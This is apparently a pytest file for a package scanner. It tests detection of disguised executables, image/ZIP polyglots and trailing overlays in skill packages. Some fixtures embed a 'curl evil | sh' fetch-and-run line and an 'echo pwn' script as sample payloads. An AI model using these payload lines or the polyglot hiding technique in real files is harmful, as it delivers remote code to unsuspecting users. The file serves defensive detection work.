"""Byte-forensics contracts for mismatch, polyglot, and overlay vectors SXV-035--037."""

from __future__ import annotations

import gzip
import io
import struct
import zipfile
import zlib

from skill_xray import ingest, parse
from skill_xray.analyze import analyze_artifact, analyze_package, sniff_magic
from skill_xray.findings import SEVERITY_RANK

_M = "---\nname: t\n---\nbody\n"
_elf = bytearray(64)
_elf[:7] = b"\x7fELF\x02\x01\x01"
_elf[20:24] = (1).to_bytes(4, "little")
_elf[52:54] = (64).to_bytes(2, "little")
_ELF = bytes(_elf)
_PE = (b"MZ" + b"\x00" * (0x3C - 2) + (0x40).to_bytes(4, "little")
       + b"PE\x00\x00" + b"\x00" * 20)


def _png_chunk(kind: bytes, data: bytes) -> bytes:
    return (len(data).to_bytes(4, "big") + kind + data
            + zlib.crc32(kind + data).to_bytes(4, "big"))


_PNG = (b"\x89PNG\r\n\x1a\n"
        + _png_chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
        + _png_chunk(b"IDAT", zlib.compress(b"\x00\x00\x00\x00"))
        + _png_chunk(b"IEND", b""))
_GIF = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff"
        b",\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")
_JPEG = (b"\xff\xd8\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00"
         b"\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00\x00\xff\xd9")


def _make_zip(members: dict) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, body in members.items():
            zf.writestr(name, body)
    return buf.getvalue()


def _analyzed(make_package, files):
    return analyze_package(parse.parse_package(ingest.build_package(str(make_package(files)))))


def _v(out, vector):
    return [f for f in out if f.vector == vector]


def test_sniff_known_and_unknown():
    assert sniff_magic(_ELF) == "elf"
    assert sniff_magic(_PE) == "pe"
    assert sniff_magic(_make_zip({"a": "b"})) == "zip"
    assert sniff_magic(_PNG) == "png"
    assert sniff_magic(gzip.compress(b"payload")) == "gzip"
    assert sniff_magic(b"# a normal markdown heading\n") is None
    assert sniff_magic(b"MZ this is just prose, not a PE") is None   # 'MZ' without a PE header
    assert sniff_magic(b"") is None
    macho = b"\xfe\xed\xfa\xcf" + struct.pack(">III", 7, 3, 2) + b"\x00" * 16
    assert sniff_magic(macho) == "macho"


def test_sniff_rejects_truncated_or_ambiguous_executable_headers():
    assert sniff_magic(b"\x7fELFgarbage") is None
    truncated_elf = bytearray(_ELF[:24])
    assert sniff_magic(bytes(truncated_elf)) is None
    assert sniff_magic(b"\xca\xfe\xba\xbe\x00\x00\x00=java-class") is None
    assert sniff_magic(b"\xfe\xed\xfa\xcf" + b"\x00" * 20) is None
    truncated_pe = _PE[:-1]
    assert sniff_magic(truncated_pe) is None
    truncated = b"\xfe\xed\xfa\xcf" + struct.pack(">III", 7, 3, 2)
    assert sniff_magic(truncated) is None


def test_executable_masquerades_are_high():
    cases = (("notes.md", "instruction", _ELF), ("assets/logo.png", "asset", _PE))
    for rel, kind, raw in cases:
        out = analyze_artifact(rel, kind, None, raw)
        findings = [f for f in out if f.vector == "SXV-035" and f.severity == "high"]
        assert findings and findings[0].offset == 0 and findings[0].length == len(raw)


def test_matching_image_and_compiled_formats_are_clean():
    assert analyze_artifact("icon.png", "asset", None, _PNG) == []
    assert analyze_artifact("lib/ext.so", "native_code", None, _ELF) == []


def test_script_renamed_to_image_is_flagged_as_text():
    out = analyze_artifact("logo.png", "asset", None, b"#!/bin/sh\ncurl evil | sh\n")
    assert any(f.vector == "SXV-035" and f.severity == "medium" for f in out)


def test_mislabeled_image_is_low_not_high():
    out = analyze_artifact("pic.png", "asset", None, b"\xff\xd8\xff\xe0\x00\x10JFIF")
    assert [f for f in out if f.severity == "high"] == []
    assert any(f.vector == "SXV-035" and f.severity == "low" for f in out)
    assert _v(analyze_artifact("font.woff", "asset", None, _PNG), "SXV-035")


def test_prepended_zip_polyglot_fires():
    raw = _GIF + _make_zip({"payload.sh": "curl evil | sh\n"})
    poly = _v(analyze_artifact("banner.gif", "asset", None, raw), "SXV-036")
    assert poly and poly[0].rule == "polyglot" and poly[0].severity == "high"
    assert poly[0].offset == 0


def test_chance_end_markers_are_clean():
    body = "here are some bytes: PK\x05\x06 in prose\n"
    assert analyze_artifact("README.md", "doc", body, body.encode()) == []
    raw = b"GIF89a" + b"\x00" * 32 + b"PK\x05\x06" + b"\x00" * 18
    assert analyze_artifact("banner.gif", "asset", None, raw) == []


def test_malformed_image_prefix_is_not_a_high_polyglot():
    invalid_gif = b"GIF89a\x01\x00\x01\x00\x00\x00\x00\x01;"
    findings = _v(
        analyze_artifact("banner.gif", "asset", None,
                         invalid_gif + _make_zip({"payload": "x"})), "SXV-036"
    )
    assert not [finding for finding in findings if finding.severity == "high"]
    invalid_jpeg = b"\xff\xd8\xff\xd9" + _make_zip({"payload": "x"})
    findings = _v(analyze_artifact("banner.jpg", "asset", None, invalid_jpeg), "SXV-036")
    assert not [finding for finding in findings if finding.severity == "high"]


def test_valid_image_with_empty_zip_is_polyglot():
    findings = _v(analyze_artifact("banner.gif", "asset", None, _GIF + _make_zip({})), "SXV-036")
    assert findings and findings[0].severity == "high"
    findings = _v(analyze_artifact("banner.jpg", "asset", None, _JPEG + _make_zip({})), "SXV-036")
    assert findings and findings[0].severity == "high"


def test_zip_overlay_variants_are_located_and_classified():
    archive = _make_zip({"a.txt": "hi"})
    generic = _v(analyze_artifact("bundle.zip", "nested_archive", None,
                                  archive + b"OVERLAY"), "SXV-037")
    assert generic and generic[0].offset == len(archive) and generic[0].length == 7
    direct = _v(analyze_artifact("bundle.zip", "nested_archive", None,
                                 archive + _ELF), "SXV-037")
    assert any(f.severity == "high" and f.evidence.get("detail") == "elf" for f in direct)
    padded = _v(analyze_artifact("bundle.zip", "nested_archive", None,
                                 archive + b"X" + _ELF), "SXV-037")
    payload = [f for f in padded if f.evidence.get("detail") == "elf"]
    assert payload and payload[0].offset == len(archive) + 1
    fake_eocd = b"PK\x05\x06" + b"\x00" * 18
    for overlay in (b"OVERLAY" + fake_eocd, b"X" * 70000):
        findings = _v(analyze_artifact("bundle.zip", "nested_archive", None,
                                       archive + overlay), "SXV-037")
        assert findings and findings[0].offset == len(archive)
    findings = _v(analyze_artifact("bundle.zip", "nested_archive", None,
                                   _make_zip({}) + _ELF), "SXV-037")
    assert findings and findings[0].severity == "high"


def test_fabricated_central_directory_is_not_a_polyglot():
    fake = b"GIF89a" + b"PK\x01\x02" + b"PK\x05\x06" + b"\x00" * 6
    fake += (1).to_bytes(2, "little") + (4).to_bytes(4, "little")
    fake += (4).to_bytes(4, "little") + b"\x00\x00"
    assert not _v(analyze_artifact("x.gif", "asset", None, fake), "SXV-036")


def test_trailing_bytes_after_png_iend():
    png = _PNG + b"APPENDED"
    ov = _v(analyze_artifact("img.png", "asset", None, png), "SXV-037")
    assert ov and ov[0].length == len(b"APPENDED")


def test_png_requires_bounded_crc_valid_zero_length_iend():
    signature = b"\x89PNG\r\n\x1a\n"
    ihdr = _png_chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
    malformed = (
        signature + ihdr + _png_chunk(b"IEND", b"payload"),
        signature + ihdr + b"\x00\x00\x00\x00IEND\x00\x00\x00\x00",
        signature + ihdr,
    )
    for raw in malformed:
        assert _v(analyze_artifact("img.png", "asset", None, raw), "SXV-037")


def test_complete_pe_overlay_is_classified_high():
    pe = bytearray(_PE)
    pe[0x3C:0x40] = (0x80).to_bytes(4, "little")
    pe[0x40:0x44] = b"\x00" * 4
    pe.extend(b"\x00" * (0x80 - len(pe)))
    pe.extend(b"PE\x00\x00" + b"\x00" * 20)
    findings = _v(
        analyze_artifact("bundle.zip", "nested_archive", None, _make_zip({"a": "b"}) + pe),
        "SXV-037",
    )
    assert findings and findings[0].severity == "high"


def test_declared_formats_reject_contradictory_bytes():
    pdf = _v(analyze_artifact("document.pdf", "active_asset", None, _make_zip({"a": "b"})),
             "SXV-035")
    assert pdf and pdf[0].severity == "high"
    assert _v(analyze_artifact("document.pdf", "active_asset", None, _PNG), "SXV-035")
    zip_as_gzip = _v(
        analyze_artifact("bundle.gz", "nested_archive", None, _make_zip({"a": "b"})),
        "SXV-035")
    gzip_as_zip = _v(
        analyze_artifact("bundle.zip", "nested_archive", None, gzip.compress(b"payload")),
        "SXV-035")
    assert zip_as_gzip and zip_as_gzip[0].evidence["detail"] == "zip"
    assert gzip_as_zip and gzip_as_zip[0].evidence["detail"] == "gzip"
    text = _v(analyze_artifact("payload.zip", "nested_archive", None, b"#!/bin/sh\necho pwn\n"),
              "SXV-035")
    image = _v(analyze_artifact("payload.zip", "nested_archive", None, _PNG), "SXV-035")
    assert text and text[0].evidence["detail"] == "text"
    assert image and image[0].evidence["detail"] == "png"
    assert _v(analyze_artifact("bundle.tar", "nested_archive", None, _make_zip({"a": "b"})),
              "SXV-035")
    assert not _v(analyze_artifact("bundle.whl", "nested_archive", None, _make_zip({"a": "b"})),
                  "SXV-035")
    assert not _v(analyze_artifact("library.jar", "native_code", None,
                                   _make_zip({"A.class": "x"})), "SXV-035")
    for rel, raw in (("Thing.class", _ELF), ("library.jar", _ELF),
                     ("library.so", _make_zip({"x": "y"}))):
        assert _v(analyze_artifact(rel, "native_code", None, raw), "SXV-035")


def test_valid_zip_after_text_prefix_is_reported():
    raw = b"#!/bin/sh\necho setup\n" + _make_zip({"payload.sh": "curl evil | sh"})
    findings = _v(analyze_artifact("notes.md", "doc", None, raw), "SXV-036")
    assert findings and findings[0].offset == 0 and findings[0].severity == "medium"


def test_embedded_payload_requires_validation_not_bare_magic():
    fake = b"GIF89a" + b"\x00" * 20 + b"\x1f\x8b\x08\x00" + b"\x00" * 20
    assert [f for f in analyze_artifact("a.gif", "asset", None, fake)
            if f.evidence.get("detail") == "gzip"] == []
    real = b"GIF89a" + b"\x00" * 20 + gzip.compress(b"#!/bin/sh\ncurl evil | sh\n")
    out = analyze_artifact("b.gif", "asset", None, real)
    assert any(f.vector == "SXV-037" and f.severity == "high"
               and f.evidence.get("detail") == "gzip" for f in out)


def test_generic_png_overlay_does_not_hide_validated_executable():
    raw = _PNG + b"padding" + _ELF
    findings = _v(analyze_artifact("image.png", "asset", None, raw), "SXV-037")
    assert any(f.severity == "high" and f.evidence.get("detail") == "elf"
               for f in findings)


def test_truncated_gzip_is_not_a_valid_embedded_payload():
    member = gzip.compress(b"payload" * 20)
    raw = _GIF + member[:-5]
    assert not [f for f in analyze_artifact("a.gif", "asset", None, raw)
                if f.evidence.get("detail") == "gzip"]


def test_zip_that_ends_exactly_is_clean():
    zb = _make_zip({"a.txt": "hi"})
    assert _v(analyze_artifact("bundle.zip", "nested_archive", None, zb), "SXV-037") == []


def test_zip_comment_is_part_of_the_logical_archive_end():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("a.txt", "hi")
        zf.comment = b"documented comment"
    archive = buf.getvalue()
    assert _v(analyze_artifact("bundle.zip", "nested_archive", None, archive), "SXV-037") == []
    findings = _v(
        analyze_artifact("bundle.zip", "nested_archive", None, archive + b"overlay"),
        "SXV-037",
    )
    assert findings and findings[0].offset == len(archive)


def test_unsupported_zip_structure_is_explicit_not_clean():
    malformed = b"PK\x03\x04not-a-complete-archivePK\x05\x06" + b"\x00" * 18
    findings = _v(
        analyze_artifact("bundle.zip", "nested_archive", None, malformed), "SXV-037"
    )
    assert findings and findings[0].severity == "low"


def test_malformed_png_fails_closed_not_silent():
    png = b"\x89PNG\r\n\x1a\n" + b"\xff\xff\xff\xffIDAT" + b"\x00\x00\x00\x00"
    assert _v(analyze_artifact("img.png", "asset", None, png), "SXV-037")


def test_decoy_tiling_is_a_capped_anomaly():
    fake = b"\x1f\x8b\x08\x00" + b"\x00" * 12
    cases = ((_PNG + b"7z\xbc\xaf\x27\x1c" * 70, "img.png"),
             (_PNG + fake * 70, "img.png"),
             (_GIF + (b"PK\x05\x06" + b"\x00" * 18) * 140, "img.gif"),
             (_PNG + b"MZ" * 70, "img.png"))
    for raw, rel in cases:
        out = analyze_artifact(rel, "asset", None, raw)
        assert any(f.vector == "SXV-037" and f.evidence.get("detail") == "capped" for f in out)


def test_empty_inputs_have_expected_behavior():
    assert sniff_magic(gzip.compress(b"")) == "gzip"
    assert analyze_artifact("x.bin", "asset", None, b"") == []


def test_analyzer_failure_is_recorded_not_raised(monkeypatch):
    import skill_xray.analyze as az

    def _boom(_raw):
        raise ValueError("boom")

    monkeypatch.setattr(az, "sniff_magic", _boom)
    out = az.analyze_artifact("x.bin", "asset", None, b"\x00\x01\x02\x03")
    assert out and out[0].rule == "analyzer-error" and out[0].severity == "high"


def test_findings_are_deterministic_and_severity_ordered(make_package):
    files = {
        "SKILL.md": _M,
        "evil.md": _ELF,                                   # high magic-mismatch
        "pic.png": b"\xff\xd8\xff\xe0\x00\x10JFIF",         # low mislabel
    }
    first = _analyzed(make_package, files)
    second = _analyzed(make_package, files)
    assert [f.to_dict() for f in first] == [f.to_dict() for f in second]   # deterministic
    sevs = [SEVERITY_RANK[f.severity] for f in first]
    assert sevs == sorted(sevs)                                            # most severe first


def test_ingest_retains_raw_reaches_analyzer(make_package):
    root = make_package({"SKILL.md": _M, "logo.png": b"\x89PNG\r\n\x1a\n"})
    pkg = ingest.build_package(str(root))
    by_rel = {a.rel: a for a in pkg.artifacts}
    assert by_rel["logo.png"].raw == b"\x89PNG\r\n\x1a\n"     # asset bytes kept for forensics
    assert by_rel["logo.png"].text is None                   # but still not decoded text
